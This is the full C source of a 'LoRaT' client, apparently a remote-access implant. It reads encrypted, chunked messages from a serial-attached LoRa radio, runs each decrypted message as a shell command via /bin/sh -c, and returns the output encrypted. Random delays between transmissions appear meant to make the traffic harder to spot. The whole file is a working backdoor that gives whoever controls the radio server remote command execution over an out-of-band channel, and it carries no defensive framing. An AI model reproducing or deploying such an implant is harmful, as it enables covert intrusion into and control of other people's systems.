
#define _POSIX_C_SOURCE 200809L
#define _DEFAULT_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <termios.h>
#include <signal.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/wait.h>

#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>


#define AES_KEY_LEN    32
#define AES_IV_LEN     16
#define AES_BLOCK_LEN  16
#define CHUNK_SIZE     180
#define MSG_ID_LEN     6
#define MAX_LINE       4096
#define MAX_CHUNKS     256
#define MAX_CHUNK_PARTS 64
#define CMD_TIMEOUT_S  10


static char *b64_encode(const uint8_t *data, size_t len)
{
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *mem = BIO_new(BIO_s_mem());
    if (!b64 || !mem) return NULL;

    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_push(b64, mem);
    if (BIO_write(b64, data, (int)len) <= 0) { BIO_free_all(b64); return NULL; }
    (void)BIO_flush(b64);

    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);

    char *out = malloc(bptr->length + 1);
    if (!out) { BIO_free_all(b64); return NULL; }
    memcpy(out, bptr->data, bptr->length);
    out[bptr->length] = '\0';

    BIO_free_all(b64);
    return out;
}

static ssize_t b64_decode(const char *b64str, uint8_t **out_data)
{
    size_t in_len = strlen(b64str);
    size_t buf_len = in_len / 4 * 3 + 4;
    uint8_t *buf = malloc(buf_len);
    if (!buf) return -1;

    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *mem = BIO_new_mem_buf(b64str, (int)in_len);
    if (!b64 || !mem) { free(buf); return -1; }

    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_push(b64, mem);

    int decoded = BIO_read(b64, buf, (int)buf_len);
    BIO_free_all(b64);

    if (decoded < 0) { free(buf); return -1; }
    *out_data = buf;
    return (ssize_t)decoded;
}

static bool is_valid_base64(const char *s)
{
    size_t n = strlen(s);
    if (n == 0 || n % 4 != 0) return false;
    for (size_t i = 0; i < n; i++) {
        char c = s[i];
        bool ok = (c >= 'A' && c <= 'Z') ||
                  (c >= 'a' && c <= 'z') ||
                  (c >= '0' && c <= '9') ||
                  c == '+' || c == '/';
        if (!ok) {
            if (c == '=' && i >= n - 2) continue;
            return false;
        }
    }
    return true;
}


typedef struct {
    uint8_t key[AES_KEY_LEN];
} LoRaTCrypto;

static void crypto_init_random(LoRaTCrypto *c)
{
    RAND_bytes(c->key, AES_KEY_LEN);
}

static bool crypto_set_key_b64(LoRaTCrypto *c, const char *b64key)
{
    uint8_t *buf = NULL;
    ssize_t len = b64_decode(b64key, &buf);
    if (len != AES_KEY_LEN) { free(buf); return false; }
    memcpy(c->key, buf, AES_KEY_LEN);
    free(buf);
    return true;
}

static char *crypto_encrypt(const LoRaTCrypto *c, const char *plaintext)
{
    uint8_t iv[AES_IV_LEN];
    RAND_bytes(iv, AES_IV_LEN);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return NULL;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, c->key, iv) != 1)
        goto fail;

    size_t pt_len = strlen(plaintext);
    size_t ct_buf_len = pt_len + AES_BLOCK_LEN;
    uint8_t *ct_buf = malloc(ct_buf_len);
    if (!ct_buf) goto fail;

    int out_len1 = 0, out_len2 = 0;
    if (EVP_EncryptUpdate(ctx, ct_buf, &out_len1,
                          (const uint8_t *)plaintext, (int)pt_len) != 1)
        goto fail2;
    if (EVP_EncryptFinal_ex(ctx, ct_buf + out_len1, &out_len2) != 1)
        goto fail2;

    EVP_CIPHER_CTX_free(ctx);

    size_t combined_len = AES_IV_LEN + out_len1 + out_len2;
    uint8_t *combined = malloc(combined_len);
    if (!combined) { free(ct_buf); return NULL; }
    memcpy(combined, iv, AES_IV_LEN);
    memcpy(combined + AES_IV_LEN, ct_buf, out_len1 + out_len2);
    free(ct_buf);

    char *result = b64_encode(combined, combined_len);
    free(combined);
    return result;

fail2: free(ct_buf);
fail:  EVP_CIPHER_CTX_free(ctx); return NULL;
}

static char *crypto_decrypt(const LoRaTCrypto *c, const char *b64data)
{
    uint8_t *combined = NULL;
    ssize_t combined_len = b64_decode(b64data, &combined);
    if (combined_len < AES_IV_LEN + AES_BLOCK_LEN) { free(combined); return NULL; }

    uint8_t *iv = combined;
    uint8_t *ct = combined + AES_IV_LEN;
    int ct_len = (int)(combined_len - AES_IV_LEN);

    if (ct_len % AES_BLOCK_LEN != 0) {
        fprintf(stderr, "[!] Decryption error: ciphertext not block-aligned\n");
        free(combined); return NULL;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(combined); return NULL; }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, c->key, iv) != 1)
        goto fail;

    uint8_t *pt_buf = malloc(ct_len + 1);
    if (!pt_buf) goto fail;

    int out_len1 = 0, out_len2 = 0;
    if (EVP_DecryptUpdate(ctx, pt_buf, &out_len1, ct, ct_len) != 1)
        goto fail2;
    if (EVP_DecryptFinal_ex(ctx, pt_buf + out_len1, &out_len2) != 1) {
        fprintf(stderr, "[!] Decryption error: bad padding or wrong key\n");
        goto fail2;
    }

    EVP_CIPHER_CTX_free(ctx);
    free(combined);

    int pt_len = out_len1 + out_len2;
    pt_buf[pt_len] = '\0';
    return (char *)pt_buf;

fail2: free(pt_buf);
fail:  EVP_CIPHER_CTX_free(ctx); free(combined); return NULL;
}

static void crypto_print_key_b64(const LoRaTCrypto *c)
{
    char *b64 = b64_encode(c->key, AES_KEY_LEN);
    if (b64) { printf("[+] Generated new key (save this for the server): %s\n", b64); free(b64); }
}


static void generate_msg_id(char out[MSG_ID_LEN + 1])
{
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < MSG_ID_LEN; i++)
        out[i] = charset[rand() % (int)(sizeof(charset) - 1)];
    out[MSG_ID_LEN] = '\0';
}

static double jittered_delay(double min_s, double max_s)
{
    double range = max_s - min_s;
    double delay = min_s + ((double)rand() / RAND_MAX) * range;
    struct timespec ts = {
        .tv_sec  = (time_t)delay,
        .tv_nsec = (long)((delay - (time_t)delay) * 1e9)
    };
    nanosleep(&ts, NULL);
    return delay;
}


typedef struct {
    char    msg_id[MSG_ID_LEN + 1];
    int     total;
    int     received;
    char   *parts[MAX_CHUNK_PARTS];
    bool    in_use;
} ChunkBuffer;

static ChunkBuffer chunk_buffers[MAX_CHUNKS];
static pthread_mutex_t chunk_lock = PTHREAD_MUTEX_INITIALIZER;

static void chunk_buffers_init(void)
{
    memset(chunk_buffers, 0, sizeof(chunk_buffers));
}

static char *handle_chunk(const char *msg_id, int current, int total,
                           const char *payload)
{
    pthread_mutex_lock(&chunk_lock);

    ChunkBuffer *slot = NULL;
    for (int i = 0; i < MAX_CHUNKS; i++) {
        if (chunk_buffers[i].in_use &&
            strcmp(chunk_buffers[i].msg_id, msg_id) == 0) {
            slot = &chunk_buffers[i];
            break;
        }
    }
    if (!slot) {
        for (int i = 0; i < MAX_CHUNKS; i++) {
            if (!chunk_buffers[i].in_use) {
                slot = &chunk_buffers[i];
                memcpy(slot->msg_id, msg_id, MSG_ID_LEN);
                slot->msg_id[MSG_ID_LEN] = '\0';
                slot->total    = total;
                slot->received = 0;
                slot->in_use   = true;
                memset(slot->parts, 0, sizeof(slot->parts));
                break;
            }
        }
    }
    if (!slot) {
        pthread_mutex_unlock(&chunk_lock);
        fprintf(stderr, "[!] Chunk buffer full, dropping message %s\n", msg_id);
        return NULL;
    }

    int idx = current - 1;
    if (idx < 0 || idx >= MAX_CHUNK_PARTS) {
        pthread_mutex_unlock(&chunk_lock);
        return NULL;
    }
    if (!slot->parts[idx]) {
        slot->parts[idx] = strdup(payload);
        slot->received++;
    }

    char *assembled = NULL;
    if (slot->received == slot->total) {
        size_t total_len = 0;
        for (int i = 0; i < slot->total; i++)
            if (slot->parts[i]) total_len += strlen(slot->parts[i]);

        assembled = malloc(total_len + 1);
        if (assembled) {
            assembled[0] = '\0';
            for (int i = 0; i < slot->total; i++)
                if (slot->parts[i]) strcat(assembled, slot->parts[i]);
        }
        for (int i = 0; i < MAX_CHUNK_PARTS; i++) { free(slot->parts[i]); slot->parts[i] = NULL; }
        slot->in_use = false;
    }

    pthread_mutex_unlock(&chunk_lock);
    return assembled;
}


typedef struct { char msg_id[MSG_ID_LEN+1]; int current, total; const char *payload; } Frame;

static bool parse_frame(const char *data, Frame *f)
{
    if (data[0] != '[') return false;
    const char *bracket_end = strchr(data + 1, ']');
    if (!bracket_end) return false;

    size_t meta_len = (size_t)(bracket_end - data - 1);
    char meta[64];
    if (meta_len >= sizeof(meta)) return false;
    memcpy(meta, data + 1, meta_len);
    meta[meta_len] = '\0';

    char *colon = strchr(meta, ':');
    if (!colon) return false;
    *colon = '\0';
    char *slash = strchr(colon + 1, '/');
    if (!slash) return false;
    *slash = '\0';

    strncpy(f->msg_id, meta, MSG_ID_LEN);
    f->msg_id[MSG_ID_LEN] = '\0';
    f->current  = atoi(colon + 1);
    f->total    = atoi(slash + 1);
    f->payload  = bracket_end + 1;
    return true;
}


static int serial_open(const char *port, int baudrate)
{
    int fd = open(port, O_RDWR | O_NOCTTY | O_NONBLOCK);
    if (fd < 0) { perror("[!] open serial"); return -1; }

    struct termios tty;
    if (tcgetattr(fd, &tty) != 0) { perror("[!] tcgetattr"); close(fd); return -1; }

    speed_t speed;
    switch (baudrate) {
        case 9600:   speed = B9600;   break;
        case 19200:  speed = B19200;  break;
        case 38400:  speed = B38400;  break;
        case 57600:  speed = B57600;  break;
        case 115200: speed = B115200; break;
        case 230400: speed = B230400; break;
        default:
            fprintf(stderr, "[!] Unsupported baudrate %d, defaulting to 115200\n", baudrate);
            speed = B115200;
    }
    cfsetispeed(&tty, speed);
    cfsetospeed(&tty, speed);

    cfmakeraw(&tty);
    tty.c_cflag |= (CLOCAL | CREAD);
    tty.c_cflag &= ~CSTOPB;
    tty.c_cflag &= ~CRTSCTS;
    tty.c_cc[VMIN]  = 0;
    tty.c_cc[VTIME] = 1;

    if (tcsetattr(fd, TCSANOW, &tty) != 0) { perror("[!] tcsetattr"); close(fd); return -1; }

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);

    return fd;
}


typedef struct {
    char        serial_port[256];
    int         baudrate;
    int         fd;
    LoRaTCrypto crypto;
    bool        running;
    bool        sending_response;
    pthread_mutex_t send_lock;
    int         sent_count;
    int         recv_count;
    char        last_sent[MAX_LINE];
    char        last_received[MAX_LINE];
} LoRaTClient;


static bool send_raw_line(int fd, const char *line)
{
    size_t len = strlen(line);
    char *buf = malloc(len + 2);
    if (!buf) return false;
    memcpy(buf, line, len);
    buf[len]   = '\n';
    buf[len+1] = '\0';
    ssize_t written = write(fd, buf, len + 1);
    free(buf);
    return written == (ssize_t)(len + 1);
}

static bool send_command(LoRaTClient *cl, const char *command)
{
    if (cl->fd < 0) { fprintf(stderr, "[!] Serial connection not available\n"); return false; }

    char *enc = crypto_encrypt(&cl->crypto, command);
    if (!enc) { fprintf(stderr, "[!] Failed to encrypt command\n"); return false; }

    size_t enc_len  = strlen(enc);
    int total_chunks = (int)((enc_len + CHUNK_SIZE - 1) / CHUNK_SIZE);

    char msg_id[MSG_ID_LEN + 1];
    generate_msg_id(msg_id);

    bool ok = true;
    for (int i = 0; i < total_chunks && ok; i++) {
        if (i > 0) {
            double delay = jittered_delay(2.0, 4.0);
            printf("[+] Jittered delay: %.2fs before chunk %d\n", delay, i + 1);
        }

        int start = i * CHUNK_SIZE;
        int end   = start + CHUNK_SIZE;
        if (end > (int)enc_len) end = (int)enc_len;

        char frame[MAX_LINE];
        int hdr_len = snprintf(frame, sizeof(frame), "[%s:%d/%d]",
                               msg_id, i + 1, total_chunks);
        if (hdr_len < 0 || hdr_len + (end - start) >= (int)sizeof(frame)) {
            fprintf(stderr, "[!] Frame too large\n"); ok = false; break;
        }
        memcpy(frame + hdr_len, enc + start, end - start);
        frame[hdr_len + (end - start)] = '\0';

        ok = send_raw_line(cl->fd, frame);
    }

    if (ok) {
        cl->sent_count++;
        strncpy(cl->last_sent, command, sizeof(cl->last_sent) - 1);
        printf("[TX %d] (%d chunk(s)) %s\n", cl->sent_count, total_chunks, command);
    }

    free(enc);
    return ok;
}


static char *process_command(const char *command)
{
    printf("[+] Executing command: %s\n", command);

    int pfd[2];
    if (pipe(pfd) < 0) {
        char *r = malloc(64); snprintf(r, 64, "ERROR: pipe failed"); return r;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pfd[0]); close(pfd[1]);
        char *r = malloc(64); snprintf(r, 64, "ERROR: fork failed"); return r;
    }
    if (pid == 0) {
        close(pfd[0]);
        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[1]);
        execl("/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }
    close(pfd[1]);

    char output[MAX_LINE * 4] = {0};
    size_t output_len = 0;
    bool timed_out = false;

    struct timeval deadline;
    gettimeofday(&deadline, NULL);
    deadline.tv_sec += CMD_TIMEOUT_S;

    while (output_len < sizeof(output) - 1) {
        struct timeval now, remaining;
        gettimeofday(&now, NULL);
        remaining.tv_sec  = deadline.tv_sec  - now.tv_sec;
        remaining.tv_usec = deadline.tv_usec - now.tv_usec;
        if (remaining.tv_usec < 0) { remaining.tv_sec--; remaining.tv_usec += 1000000; }
        if (remaining.tv_sec < 0 || (remaining.tv_sec == 0 && remaining.tv_usec <= 0)) {
            timed_out = true; break;
        }

        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(pfd[0], &rfds);
        int sel = select(pfd[0] + 1, &rfds, NULL, NULL, &remaining);
        if (sel < 0) break;
        if (sel == 0) { timed_out = true; break; }

        ssize_t n = read(pfd[0], output + output_len, sizeof(output) - 1 - output_len);
        if (n <= 0) break;
        output_len += n;
    }
    close(pfd[0]);

    if (timed_out) {
        kill(pid, SIGKILL);
        waitpid(pid, NULL, 0);
        char *r = malloc(64); snprintf(r, 64, "ERROR: Command timed out"); return r;
    }
    waitpid(pid, NULL, 0);

    while (output_len > 0 && (output[output_len-1] == '\n' || output[output_len-1] == '\r'))
        output[--output_len] = '\0';

    char *r;
    if (output_len > 0) {
        r = malloc(strlen("RESPONSE: ") + output_len + 1);
        if (!r) return NULL;
        strcpy(r, "RESPONSE: ");
        memcpy(r + strlen("RESPONSE: "), output, output_len + 1);
    } else {
        r = strdup("RESPONSE: Command executed successfully");
    }
    return r;
}


static char line_buf[MAX_LINE * 8];
static size_t line_buf_len = 0;

static void read_serial_once(LoRaTClient *cl)
{
    if (cl->fd < 0 || cl->sending_response) return;

    uint8_t tmp[512];
    ssize_t n = read(cl->fd, tmp, sizeof(tmp));
    if (n <= 0) return;

    if (line_buf_len + n >= sizeof(line_buf)) {
        line_buf_len = 0;
    }
    memcpy(line_buf + line_buf_len, tmp, n);
    line_buf_len += n;

    char *start = line_buf;
    while (true) {
        char *nl = memchr(start, '\n', line_buf_len - (size_t)(start - line_buf));
        if (!nl) break;
        *nl = '\0';

        size_t llen = strlen(start);
        if (llen > 0 && start[llen - 1] == '\r') start[--llen] = '\0';

        if (llen == 0) { start = nl + 1; continue; }

        const char *data = start;
        const char *encrypted_data = NULL;
        char *assembled = NULL;

        Frame f;
        if (parse_frame(data, &f)) {
            assembled = handle_chunk(f.msg_id, f.current, f.total, f.payload);
            if (!assembled) { start = nl + 1; continue; }
            encrypted_data = assembled;
        } else {
            encrypted_data = data;
        }

        if (!is_valid_base64(encrypted_data)) {
            fprintf(stderr, "[!] Invalid base64 data received: %.50s...\n", encrypted_data);
            free(assembled);
            start = nl + 1;
            continue;
        }

        char *decrypted = crypto_decrypt(&cl->crypto, encrypted_data);
        free(assembled);
        if (!decrypted) {
            fprintf(stderr, "[!] Failed to decrypt received data\n");
            start = nl + 1;
            continue;
        }

        cl->recv_count++;
        strncpy(cl->last_received, decrypted, sizeof(cl->last_received) - 1);
        printf("[RX %d] %s\n", cl->recv_count, decrypted);

        char *response = process_command(decrypted);
        free(decrypted);

        if (response) {
            pthread_mutex_lock(&cl->send_lock);
            cl->sending_response = true;
            send_command(cl, response);
            cl->sending_response = false;
            pthread_mutex_unlock(&cl->send_lock);
            free(response);
        }

        start = nl + 1;
    }

    size_t remaining = line_buf_len - (size_t)(start - line_buf);
    if (remaining > 0 && start != line_buf)
        memmove(line_buf, start, remaining);
    line_buf_len = remaining;
}

static void *read_thread_fn(void *arg)
{
    LoRaTClient *cl = (LoRaTClient *)arg;
    while (cl->running) {
        read_serial_once(cl);
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 50000000 };
        nanosleep(&ts, NULL);
    }
    return NULL;
}


static volatile bool g_running = true;

static void sig_handler(int sig)
{
    (void)sig;
    g_running = false;
}

int main(int argc, char *argv[])
{
    srand((unsigned)time(NULL));

    const char *port     = NULL;
    int         baudrate = 115200;
    const char *key_b64  = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            port = argv[++i];
        } else if (strcmp(argv[i], "--baudrate") == 0 && i + 1 < argc) {
            baudrate = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--key") == 0 && i + 1 < argc) {
            key_b64 = argv[++i];
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s --port <dev> [--baudrate <bps>] [--key <base64>]\n", argv[0]);
            return 0;
        }
    }

    if (!port) {
        fprintf(stderr, "Usage: %s --port <dev> [--baudrate <bps>] [--key <base64>]\n", argv[0]);
        return 1;
    }

    LoRaTClient cl;
    memset(&cl, 0, sizeof(cl));
    pthread_mutex_init(&cl.send_lock, NULL);

    if (key_b64) {
        if (!crypto_set_key_b64(&cl.crypto, key_b64)) {
            fprintf(stderr, "[!] Invalid base64 key\n"); return 1;
        }
        printf("[+] Using provided key\n");
    } else {
        printf("[!] No encryption key provided. Generating a new one.\n");
        crypto_init_random(&cl.crypto);
        crypto_print_key_b64(&cl.crypto);
    }

    strncpy(cl.serial_port, port, sizeof(cl.serial_port) - 1);
    cl.baudrate = baudrate;
    cl.fd = serial_open(port, baudrate);
    if (cl.fd < 0) return 1;
    printf("[+] Connected to %s at %d baud\n", port, baudrate);

    chunk_buffers_init();

    cl.running = true;
    printf("[+] LoRaT Client started. Waiting for commands from server...\n");

    pthread_t read_tid;
    if (pthread_create(&read_tid, NULL, read_thread_fn, &cl) != 0) {
        perror("[!] pthread_create"); return 1;
    }

    signal(SIGINT,  sig_handler);
    signal(SIGTERM, sig_handler);

    while (g_running) {
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 100000000 };
        nanosleep(&ts, NULL);
    }

    cl.running = false;
    pthread_join(read_tid, NULL);

    close(cl.fd);
    printf("[+] Serial connection closed\n");
    printf("[+] LoRaT Client stopped\n");

    pthread_mutex_destroy(&cl.send_lock);
    return 0;
}